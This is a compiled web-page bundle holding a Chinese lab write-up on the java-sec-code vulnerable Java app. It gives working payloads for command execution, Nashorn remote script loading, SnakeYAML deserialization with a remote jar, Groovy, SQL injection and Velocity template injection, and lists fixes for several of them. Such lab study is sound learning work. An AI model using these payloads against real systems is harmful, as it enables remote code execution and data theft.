import{Bt as e,G as t,Ht as n,Q as r,U as i,W as a,er as o,qn as s,qt as c,yn as l}from"./framework.rjUWPBWi.js";import{n as u}from"./theme.HhYiq06G.js";import"./chunks/vue-i18n.Bu3NfVdi.js";import{a as d,i as f}from"./chunks/vue-router.BUgoFmsr.js";var p={__name:`java-sec-code`,setup(p,{expose:m}){let h=s(JSON.parse(`{"title":"java-sec-code","description":"","frontmatter":{"title":"java-sec-code","date":"2025-6-26 20:58:52","tags":["java"],"categories":["学习笔记"],"firstImage":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412062003249.png"},"headers":[],"relativePath":"pages/posts/java-sec-code.md"}`)),g=d(),_=f(),v=Object.assign(_.meta.frontmatter||{},h.value?.frontmatter||{});return g.currentRoute.value.data=h.value,n(`valaxy:frontmatter`,v),globalThis.$frontmatter=v,m({frontmatter:{title:`java-sec-code`,date:`2025-6-26 20:58:52`,tags:[`java`],categories:[`学习笔记`]}}),(n,s)=>{let d=u;return e(),a(d,{frontmatter:o(v)},{"main-content-md":l(()=>[s[0]||=i(`p`,null,[r(`摘要：靶场需访问`),i(`a`,{href:`http://localhost:8080/index`,target:`_blank`,rel:`noreferrer`},`http://localhost:8080/index`),r(` 默认账号密码为admin admin123 题目在源码里（亏我找半天） 由于后面环境是docker开的，计算器可能弹不出来 RCE 1. /rce/runtime/exec 命令执行：通过调用 Runtime.getRuntime.e。`)],-1),t(` more `),s[1]||=i(`p`,null,[r(`靶场需访问`),i(`a`,{href:`http://localhost:8080/index`,target:`_blank`,rel:`noreferrer`},`http://localhost:8080/index`)],-1),s[2]||=i(`p`,null,`默认账号密码为admin admin123`,-1),s[3]||=i(`p`,null,`题目在源码里（亏我找半天）`,-1),s[4]||=i(`p`,null,`由于后面环境是docker开的，计算器可能弹不出来`,-1),s[5]||=i(`h3`,{id:`rce`,tabindex:`-1`},[r(`RCE `),i(`a`,{class:`header-anchor`,href:`#rce`,"aria-label":`Permalink to "RCE"`},`​`)],-1),s[6]||=i(`h4`,{id:`_1-rce-runtime-exec`,tabindex:`-1`},[r(`1. /rce/runtime/exec `),i(`a`,{class:`header-anchor`,href:`#_1-rce-runtime-exec`,"aria-label":`Permalink to "1. /rce/runtime/exec"`},`​`)],-1),s[7]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`@GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        Runtime run = Runtime.getRuntime();
        StringBuilder sb = new StringBuilder();

        try {
            Process p = run.exec(cmd);
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            return e.toString();
        }
        return sb.toString();
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[8]||=i(`p`,null,[i(`strong`,null,`命令执行`),r(`：通过调用 `),i(`code`,null,`Runtime.getRuntime().exec(cmd)`),r(` 执行传入的命令，这会启动一个新的子进程来执行该命令。`)],-1),s[9]||=i(`p`,null,[i(`strong`,null,`输入流处理`),r(`：使用 `),i(`code`,null,`BufferedInputStream`),r(` 和 `),i(`code`,null,`BufferedReader`),r(` 从子进程的标准输出流中读取命令执行的结果。这些结果会被累积到一个 `),i(`code`,null,`StringBuilder`),r(` 中。`)],-1),s[10]||=i(`p`,null,[i(`strong`,null,`异常捕获`),r(`：如果执行过程中发生异常，捕获并返回异常的字符串描述。`)],-1),s[11]||=i(`p`,null,[i(`strong`,null,`退出码处理`),r(`：在命令执行完成后，检查子进程的退出码。如果退出码不为零且为 1，则表示命令执行失败。`)],-1),s[12]||=i(`p`,null,[i(`strong`,null,`返回结果`),r(`：如果命令执行成功，返回命令的输出内容；如果发生错误，则返回错误信息。`)],-1),s[13]||=i(`p`,null,`我们可以通过Runtime.getRuntime()这个方法来进行命令执行，在该代码里它通过传入cmd变量进行命令执行`,-1),s[14]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`?cmd=whoami
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[15]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412062003249.png`,alt:`image-20241206200351163`,loading:`lazy`,decoding:`async`})],-1),s[16]||=i(`h4`,{id:`_2-rce-processbuilder`,tabindex:`-1`},[r(`2./rce/ProcessBuilder `),i(`a`,{class:`header-anchor`,href:`#_2-rce-processbuilder`,"aria-label":`Permalink to "2./rce/ProcessBuilder"`},`​`)],-1),s[17]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},` @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {
        StringBuilder sb = new StringBuilder();
        try {
            String[] arrCmd = {"/bin/sh", "-c", cmd};
            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            return e.toString();
        }

        return sb.toString();
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[18]||=i(`p`,null,[i(`strong`,null,`命令执行`),r(`： `),i(`code`,null,`String[] arrCmd = {"/bin/sh", "-c", cmd};`),r(` 通过 `),i(`code`,null,`ProcessBuilder`),r(` 启动一个新的 shell 进程，执行传入的命令 `),i(`code`,null,`cmd`),r(`。这里使用 `),i(`code`,null,`-c`),r(` 选项告诉 shell 执行字符串中的命令。`)],-1),s[19]||=i(`p`,null,[i(`strong`,null,`启动进程`),r(`： `),i(`code`,null,`Process p = processBuilder.start();`),r(` 启动进程后，获取该进程的标准输出流并读取其内容。`)],-1),s[20]||=i(`p`,null,[i(`strong`,null,`读取输出`),r(`： 通过 `),i(`code`,null,`BufferedInputStream`),r(` 和 `),i(`code`,null,`BufferedReader`),r(` 逐行读取进程的输出并存储在 `),i(`code`,null,`StringBuilder`),r(` 中。`)],-1),s[21]||=i(`p`,null,[i(`strong`,null,`异常处理`),r(`： 如果命令执行失败或抛出异常，会返回异常的字符串表示。`)],-1),s[22]||=i(`p`,null,`该代码通过get请求传入一个cmd，然后利用ProcessBuilder这个类调用系统进程来命令执行`,-1),s[23]||=i(`p`,null,`注意，在windows系统里`,-1),s[24]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`String[] arrCmd = {"cmd.exe", "/c", cmd};
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[25]||=i(`p`,null,`我们需要在源代码中修改，不然命令执行会报错`,-1),s[26]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412062024910.png`,alt:`image-20241206202436880`,loading:`lazy`,decoding:`async`})],-1),s[27]||=i(`h4`,{id:`_3-rce-jscmd`,tabindex:`-1`},[r(`3./rce/jscmd `),i(`a`,{class:`header-anchor`,href:`#_3-rce-jscmd`,"aria-label":`Permalink to "3./rce/jscmd"`},`​`)],-1),s[28]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`    @GetMapping("/jscmd")
    public void jsEngine(String jsurl) throws Exception{
        // js nashorn javascript ecmascript
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        String cmd = String.format("load(\\"%s\\")", jsurl);
        engine.eval(cmd, bindings);
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[29]||=i(`p`,null,[r(`我们可以看到它接收一个名为 `),i(`code`,null,`jsurl`),r(` 的参数；`)],-1),s[30]||=i(`p`,null,`然后使用 Nashorn JavaScript 引擎执行传入 URL 所加载的 JavaScript 脚本。`,-1),s[31]||=i(`p`,null,`由于命令无回显，我们可以通过报错来判断`,-1),s[32]||=i(`p`,null,`shell.js`,-1),s[33]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("calc.exe");
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[34]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`/rce/jscmd?jsurl=http://ip/shell.js
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[35]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505222139928.png`,alt:`image-20250522213856792`,loading:`lazy`,decoding:`async`})],-1),s[36]||=i(`p`,null,`说不存在clac.exe，的确不存在，这说明命令成功执行`,-1),s[37]||=i(`h4`,{id:`_4-rce-vuln-yarm`,tabindex:`-1`},[r(`4./rce/vuln/yarm `),i(`a`,{class:`header-anchor`,href:`#_4-rce-vuln-yarm`,"aria-label":`Permalink to "4./rce/vuln/yarm"`},`​`)],-1),s[38]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`   @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        Yaml y = new Yaml();
        y.load(content);
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[39]||=i(`p`,null,[i(`code`,null,`SnakeYaml`),r(`是用来解析yaml的格式，可以用于Java对象的序列化、反序列化。该代码利用SnakeYAML存在的反序列化漏洞来rce，在解析恶意 yml 内容时会完成指定的动作，实现命令执行。我们所加载的yaml文件如下：`)],-1),s[40]||=i(`div`,{class:`language-yaml`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`yaml`),i(`pre`,null,[i(`code`,{class:`language-yaml`},`!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://127.0.0.1/yaml-payload.jar"]
  ]]
]

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[41]||=i(`p`,null,`jar是我们远程加载的恶意文件，源码如下`,-1),s[42]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("whoami");
            Runtime.getRuntime().exec("calc.exe");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[43]||=i(`p`,null,`整个脚本也都比较简单，就是实现了ScriptEngineFactory接口，然后调用Runtime.getRuntime().exec执行命令。`,-1),s[44]||=i(`p`,null,[r(`payload链接：`),i(`a`,{href:`https://github.com/artsploit/yaml-payload`,target:`_blank`,rel:`noreferrer`},`https://github.com/artsploit/yaml-payload`)],-1),s[45]||=i(`p`,null,`打包为jar`,-1),s[46]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),t(` image: image-20250525193848130 (local Typora path, not available on build server) `),s[47]||=i(`p`,null,`漏洞修复`,-1),s[48]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[49]||=i(`h4`,{id:`_5-rce-groovy`,tabindex:`-1`},[r(`5./rce/groovy `),i(`a`,{class:`header-anchor`,href:`#_5-rce-groovy`,"aria-label":`Permalink to "5./rce/groovy"`},`​`)],-1),s[50]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`@GetMapping("groovy")
public void groovyshell(String content) {
    GroovyShell groovyShell = new GroovyShell();
    groovyShell.evaluate(content);
}

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[51]||=i(`p`,null,`Groovy是一种基于JVM（Java虚拟机）的敏捷开发语言，它结合了Python、Ruby和Smalltalk的许多强大的特性，Groovy 代码能够与 Java 代码很好地结合，也能用于扩展现有代码。由于其运行在 JVM 上的特性，Groovy 可以使用其他 Java 语言编写的库。`,-1),s[52]||=i(`p`,null,`执行命令`,-1),s[53]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`/rce/groovy?content="calc.exe".execute()
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[54]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505251952938.png`,alt:`image-20250525195244895`,loading:`lazy`,decoding:`async`})],-1),s[55]||=i(`p`,null,`由于靶场是在docker搭建的，所以弹不出计算器，会提示不存在这个文件`,-1),s[56]||=i(`h3`,{id:`sql注入`,tabindex:`-1`},[r(`SQL注入 `),i(`a`,{class:`header-anchor`,href:`#sql注入`,"aria-label":`Permalink to "SQL注入"`},`​`)],-1),s[57]||=i(`h4`,{id:`_1-sqli-jdbc-vuln`,tabindex:`-1`},[r(`1./sqli/jdbc/vuln `),i(`a`,{class:`header-anchor`,href:`#_1-sqli-jdbc-vuln`,"aria-label":`Permalink to "1./sqli/jdbc/vuln"`},`​`)],-1),s[58]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`    @RequestMapping("/jdbc/vuln")
    public String jdbc_sqli_vul(@RequestParam("username") String username) {

        StringBuilder result = new StringBuilder();

        try {
            Class.forName(driver);
            Connection con = DriverManager.getConnection(url, user, password);

            if (!con.isClosed())
                System.out.println("Connect to database successfully.");

            // sqli vuln code
            Statement statement = con.createStatement();
            String sql = "select * from users where username = '" + username + "'";
            logger.info(sql);
            ResultSet rs = statement.executeQuery(sql);

            while (rs.next()) {
                String res_name = rs.getString("username");
                String res_pwd = rs.getString("password");
                String info = String.format("%s: %s\\n", res_name, res_pwd);
                result.append(info);
                logger.info(info);
            }
            rs.close();
            con.close();

        } catch (ClassNotFoundException e) {
            logger.error("Sorry, can't find the Driver!");
        } catch (SQLException e) {
            logger.error(e.toString());
        }
        return result.toString();
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[59]||=i(`p`,null,`漏洞成因：直接插入username，造成sql注入`,-1),s[60]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},` String sql = "select * from users where username = '" + username + "'";
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[61]||=i(`p`,null,`测试`,-1),s[62]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`?username=-1' union select 1,database(),3,4--+
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[63]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252024745.png`,alt:`image-20250525202433620`,loading:`lazy`,decoding:`async`})],-1),s[64]||=i(`p`,null,`防护`,-1),s[65]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},` 
            // fix code
            String sql = "select * from users where username = ?";
            PreparedStatement st = con.prepareStatement(sql);
            st.setString(1, username);

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[66]||=i(`h4`,{id:`_2-sqli-jdbc-ps-vuln`,tabindex:`-1`},[r(`2./sqli/jdbc/ps/vuln `),i(`a`,{class:`header-anchor`,href:`#_2-sqli-jdbc-ps-vuln`,"aria-label":`Permalink to "2./sqli/jdbc/ps/vuln"`},`​`)],-1),s[67]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`@RequestMapping("/jdbc/ps/vuln")
    public String jdbc_ps_vuln(@RequestParam("username") String username) {

        StringBuilder result = new StringBuilder();
        try {
            Class.forName(driver);
            Connection con = DriverManager.getConnection(url, user, password);

            if (!con.isClosed())
                System.out.println("Connecting to Database successfully.");

            String sql = "select * from users where username = '" + username + "'";
            PreparedStatement st = con.prepareStatement(sql);

            logger.info(st.toString());
            ResultSet rs = st.executeQuery();

            while (rs.next()) {
                String res_name = rs.getString("username");
                String res_pwd = rs.getString("password");
                String info = String.format("%s: %s\\n", res_name, res_pwd);
                result.append(info);
                logger.info(info);
            }

            rs.close();
            con.close();

        } catch (ClassNotFoundException e) {
            logger.error("Sorry, can't find the Driver!");
            e.printStackTrace();
        } catch (SQLException e) {
            logger.error(e.toString());
        }
        return result.toString();
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[68]||=i(`p`,null,`漏洞成因：预处理语句在sql语句之后，没起到防护的作用`,-1),s[69]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`String sql = "select * from users where username = '" + username + "'";
PreparedStatement st = con.prepareStatement(sql);
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[70]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252035488.png`,alt:`image-20250525203533438`,loading:`lazy`,decoding:`async`})],-1),s[71]||=i(`h4`,{id:`_3-sqli-mybatis-vuln01`,tabindex:`-1`},[r(`3./sqli/mybatis/vuln01 `),i(`a`,{class:`header-anchor`,href:`#_3-sqli-mybatis-vuln01`,"aria-label":`Permalink to "3./sqli/mybatis/vuln01"`},`​`)],-1),s[72]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`    @GetMapping("/mybatis/vuln01")
    public List<User> mybatisVuln01(@RequestParam("username") String username) {
        return userMapper.findByUserNameVuln01(username);
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[73]||=i(`p`,null,`我们来看findByUserNameVuln01`,-1),s[74]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`@Select("select * from users where username = '\${username}'")
    List<User> findByUserNameVuln01(@Param("username") String username);

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[75]||=i(`p`,null,[r(`这里用到的是MyBatis框架，用来指定 SQL 查询语句。`),i(`strong`,null,[i(`code`,null,"${username}")]),r(`：在这里，`),i(`code`,null,`username`),r(` 是直接拼接到 SQL 查询中的。这意味着输入的内容会直接插入到 SQL 语句中，而不会进行任何预处理或转义。因此我们仍然可以用上面的方法进行SQL注入。`)],-1),s[76]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252101651.png`,alt:``,loading:`lazy`,decoding:`async`})],-1),s[77]||=i(`p`,null,`修复代码：`,-1),s[78]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`@Select("select * from users where username = #{username}")
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[79]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252101651.png`,alt:`image-20250525210117585`,loading:`lazy`,decoding:`async`})],-1),s[80]||=i(`h4`,{id:`_4-sqli-mybatis-vuln02`,tabindex:`-1`},[r(`4./sqli/mybatis/vuln02 `),i(`a`,{class:`header-anchor`,href:`#_4-sqli-mybatis-vuln02`,"aria-label":`Permalink to "4./sqli/mybatis/vuln02"`},`​`)],-1),s[81]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`    @GetMapping("/mybatis/vuln02")
    public List<User> mybatisVuln02(@RequestParam("username") String username) {
        return userMapper.findByUserNameVuln02(username);
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[82]||=i(`p`,null,`我们来看findByUserNameVuln02`,-1),s[83]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`List<User> findByUserNameVuln02(String username);
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[84]||=i(`p`,null,`这里去掉了映射关系，不影响漏洞存在，仍然可以使用之前payload`,-1),s[85]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252119621.png`,alt:`image-20250525211935573`,loading:`lazy`,decoding:`async`})],-1),s[86]||=i(`h4`,{id:`_5-sqli-mybatis-orderby-vuln03`,tabindex:`-1`},[r(`5./sqli/mybatis/orderby/vuln03 `),i(`a`,{class:`header-anchor`,href:`#_5-sqli-mybatis-orderby-vuln03`,"aria-label":`Permalink to "5./sqli/mybatis/orderby/vuln03"`},`​`)],-1),s[87]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,` @GetMapping("/mybatis/orderby/vuln03")
    public List<User> mybatisVuln03(@RequestParam("sort") String sort) {
        return userMapper.findByUserNameVuln03(sort);
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[88]||=i(`p`,null,`我们来看findByUserNameVuln03`,-1),s[89]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`List<User> findByUserNameVuln03(@Param("order") String order);
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[90]||=i(`p`,null,`使用了MyBatis框架中的order字段，换用下面方法进行注入：`,-1),s[91]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`?sort=id desc--+
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[92]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252145129.png`,alt:`image-20250525214518039`,loading:`lazy`,decoding:`async`})],-1),s[93]||=i(`h4`,{id:`sql注入修复与防护`,tabindex:`-1`},[r(`sql注入修复与防护 `),i(`a`,{class:`header-anchor`,href:`#sql注入修复与防护`,"aria-label":`Permalink to "sql注入修复与防护"`},`​`)],-1),s[94]||=i(`p`,null,`1.预编译`,-1),s[95]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`String sql = "select * from users where username = ?";
PreparedStatement st = con.prepareStatement(sql);

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[96]||=i(`p`,null,`2.waf`,-1),s[97]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},` private static final Pattern FILTER_PATTERN = Pattern.compile("^[a-zA-Z0-9_/\\\\.-]+$");
 public static String sqlFilter(String sql) {
        if (!FILTER_PATTERN.matcher(sql).matches()) {
            return null;
        }
        return sql;
    

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[98]||=i(`p`,null,`3.MyBatis防护`,-1),s[99]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`@Select("select * from users where username = #{username}")
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[100]||=i(`h3`,{id:`ssti`,tabindex:`-1`},[r(`SSTI `),i(`a`,{class:`header-anchor`,href:`#ssti`,"aria-label":`Permalink to "SSTI"`},`​`)],-1),s[101]||=i(`h4`,{id:`ssti-velocity`,tabindex:`-1`},[r(`/ssti/velocity `),i(`a`,{class:`header-anchor`,href:`#ssti-velocity`,"aria-label":`Permalink to "/ssti/velocity"`},`​`)],-1),s[102]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`  @GetMapping("/velocity")
    public void velocity(String template) {
        Velocity.init();

        VelocityContext context = new VelocityContext();

        context.put("author", "Elliot A.");
        context.put("address", "217 E Broadway");
        context.put("phone", "555-1337");

        StringWriter swOut = new StringWriter();
        Velocity.evaluate(context, swOut, "test", template);
    }
}

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[103]||=i(`p`,null,[i(`a`,{href:`https://zhida.zhihu.com/search?content_id=247409254&content_type=Article&match_order=1&q=Apache+Velocity&zhida_source=entity`,target:`_blank`,rel:`noreferrer`},`Apache Velocity`),r(`是一个基于模板的引擎，用于生成文本输出(例如：HTML、XML或任何其他形式的ASCII文本)，它的设计目标是提供一种简单且灵活的方式来将模板和`),i(`a`,{href:`https://zhida.zhihu.com/search?content_id=247409254&content_type=Article&match_order=1&q=%E4%B8%8A%E4%B8%8B%E6%96%87%E6%95%B0%E6%8D%AE&zhida_source=entity`,target:`_blank`,rel:`noreferrer`},`上下文数据`),r(`结合在一起，因此被广泛应用于各种Java应用程序中包括Web应用`)],-1),s[104]||=i(`p`,null,`模版注入问题各个语言斗鱼，但这里只用到了velocity，除了velocity，thymeleaf等都是会有ssti问题`,-1),s[105]||=i(`p`,null,[i(`strong`,null,`Velocity.evaluate`)],-1),s[106]||=i(`p`,null,[i(`strong`,null,`方法介绍`)],-1),s[107]||=i(`p`,null,`Velocity.evaluate是Velocity引擎中的一个方法，用于处理字符串模板的评估，Velocity是一个基于Java的模板引擎，广泛应用于WEB开发和其他需要动态内容生成的场合，Velocity.evaluate方法的主要作用是将给定的模板字符串与上下文对象结合并生成最终的输出结果，这个方法通常用于在运行时动态创建内容，比如：生成HTML页面的内容或电子邮件的文本，方法如下所示：`,-1),s[108]||=i(`div`,{class:`language-text`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`text`),i(`pre`,null,[i(`code`,{class:`language-text`},`public static void evaluate(Context context, Writer writer, String templateName, String template)
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[109]||=i(`p`,null,`参数说明：`,-1),s[110]||=i(`ul`,null,[i(`li`,null,`Context context：提供模板所需的数据上下文，可以包含多个键值对`),i(`li`,null,`Writer writer：输出流，用于写入生成的内容`),i(`li`,null,`String templateName：模板的名称，通常用于调试信息中`),i(`li`,null,`String template：要评估的模板字符串`)],-1),s[111]||=i(`p`,null,`我们构造如下payload`,-1),s[112]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc")
